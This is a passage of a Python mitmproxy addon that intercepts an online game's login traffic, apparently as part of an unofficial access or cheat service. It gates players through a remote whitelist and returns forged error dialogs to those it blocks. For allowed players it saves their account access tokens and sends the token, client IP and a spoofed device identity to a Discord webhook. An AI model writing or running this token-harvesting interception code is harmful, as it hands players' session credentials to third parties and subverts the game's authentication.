                if not resolved_uid and getattr(flow, 'account_token', None):
                    player_data = get_player_details(flow.account_token)
                    if player_data.get("success"):
                        p_uid = player_data.get("uid")
                        if p_uid and p_uid != "Unknown" and str(p_uid).strip().isdigit():
                            resolved_uid = str(p_uid).strip()
                            flow.resolved_uid = resolved_uid
                            flow.resolved_nickname = player_data.get("nickname", "Unknown")
                            flow.resolved_region = player_data.get("region", "Unknown")

                jwt_uid = getattr(flow, 'account_id', None)
                
                # Server Maintenance Mode Interceptor (Enforced globally)
                fetch_whitelist()
                if _maintenance_mode:
                    uid_display = str(resolved_uid or payload_uid or jwt_uid or "Protected").strip()
                    nickname_display = getattr(flow, "resolved_nickname", "")
                    print(f"[mitmdump] MAINTENANCE MODE ACTIVE UID {uid_display} ({nickname_display}) blocked | IP: {client_ip}")
                    maint_dialog = build_maintenance_message(uid_display, _maintenance_message, nickname=nickname_display)
                    flow.response = http.Response.make(
                        400,
                        maint_dialog.encode("utf-8"),
                        {"Content-Type": "text/plain; charset=utf-8"}
                    )
                    return

                # ONLY USE REAL NUMERICAL ACCOUNT_ID
                uid = resolved_uid or payload_uid or jwt_uid
                if not uid or not str(uid).strip().isdigit():
                    # No UID in this packet yet -> let login flow proceed naturally
                    return

                uid_str = str(uid).strip()
                nickname = getattr(flow, "resolved_nickname", "Unknown")

                is_whitelisted, reason, uid_info = is_uid_whitelisted(uid_str)
                
                if not is_whitelisted:
                    # NOT WHITELISTED OR EXPIRED -> In-Game Visual Pop-up Error Dialog via HTTP 400
                    print(f"[mitmdump] ACCESS DENIED UID: {uid_str} ({nickname}) | IP: {client_ip} | Reason: {reason}")
                    error_message = build_access_denied_message(uid_str, reason, nickname=nickname)
                    flow.response = http.Response.make(
                        400,
                        error_message.encode("utf-8"),
                        {"Content-Type": "text/plain; charset=utf-8"}
                    )
                    print(f"[MAJORLOGIN] UID {uid_str} not whitelisted, sent access denied dialog")
                    return

                # WHITELISTED -> Save account credentials & send discord webhook
                print(f"[mitmdump] WHITELIST ALLOWED UID: {uid_str} | IP: {client_ip} | Access Granted!")
                
                server_region = extract_server_region_from_proto(decrypted_response) if decrypted_response else None
                final_region = server_region or getattr(flow, "resolved_region", None) or getattr(flow, "server_region", None) or getattr(flow, "account_region", None) or "BD"
                token = getattr(flow, "account_token", None)
                nickname = getattr(flow, "resolved_nickname", "Unknown")
                
                if final_region and token:
                    save_account_credentials(final_region, uid_str, token, nickname)
                    dev_name = getattr(flow, "spoofed_dev_name", "iPhone 16 Pro Max")
                    dev_uuid = getattr(flow, "spoofed_dev_uuid", "DYNAMIC-UUID")
                    send_discord_webhook(
                        region=final_region,
                        open_id=uid_str,
                        access_token=token,
                        client_ip=client_ip,
                        dev_name=dev_name,
                        dev_uuid=dev_uuid,
                        nickname=nickname
                    )
            except Exception as e:
                print(f"[mitmdump] MajorLogin Response Error: {e}")

addons = [AuthPayloadOverwriter()]